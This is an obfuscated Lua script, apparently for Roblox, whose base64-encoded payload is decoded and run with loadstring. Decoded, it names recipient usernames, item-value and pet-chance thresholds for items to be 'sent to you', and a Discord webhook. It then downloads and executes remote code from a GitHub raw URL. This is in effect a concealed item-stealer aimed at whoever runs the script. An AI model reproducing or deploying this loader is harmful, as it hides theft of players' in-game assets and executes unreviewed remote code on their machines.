
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJueWVoc2syIiwKICAgICJueWVoc2syIiwKICAgICJueWVoc2syIiwKfQptaW5fcmFwID0gMTAwMDAgLS0gbWluaW11bSByYXAgb2YgZWFjaCBpdGVtIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQptaW5fY2hhbmNlID0gMTAwMDAwMCAtLSBtaW5pbXVtIGNoYW5jZSBvZiBwZXRzIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQp3ZWJob29rID0gIvCfjq4gKipZb3VyIEdlbmVyYXRlZCBTY3JpcHQqKiAg8J+TnCAqKlJhdyBTY3JpcHQgVVJMOioqIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvYm90L21haW4vc2NyaXB0cy9zY3JpcHQtM2JkMTJmNzUwMjM3Lmx1YSAg8J+TiyAqKlNjcmlwdCBMb2FkZXI6KiogYGBgbHVhIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vMjE0RWxpL2JvdC9tYWluL3NjcmlwdHMvc2NyaXB0LTNiZDEyZjc1MDIzNy5sdWEiLCB0cnVlKSkoKSBgYGAgIPCfk50gKipPcmlnaW5hbCBTY3JpcHQ6KiogYGBgbHVhICBVc2VybmFtZXMgPSB7ICAgICAibnllaHNrMiIsICAgICAibnllaHNrMiIsICAgICAibnllaHNrMiIsIH0gbWluX3JhcCA9IDEwMDAwIC0tIG1pbmltdW0gcmFwIG9mIGVhY2ggaXRlbSB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3UgbWluX2NoYW5jZSA9IDEwMDAgLS0gbWluaW11bSBjaGFuY2Ugb2YgcGV0cyB5b3Ugd2FudCB0byBnZXQgc2VudCB0byB5b3Ugd2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQzOTU5ODYwMjQwMzIyNjY0L1FQYUhuNnFIZDM4dExWbmRLMjZvM0h6ZnVEcW1ldGFZR1JoRGJ4bGVzcnQycHFVTUFRVVNYUWM5Ymh6cmg4UjhoX19TIiBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9wZXQlMjBnbyIsIHRydWUpKSgpIGBgYCIKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvMjE0c2NyaXB0cy9yZWZzL2hlYWRzL21haW4vcGV0JTIwZ28iLCB0cnVlKSkoKQ=="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()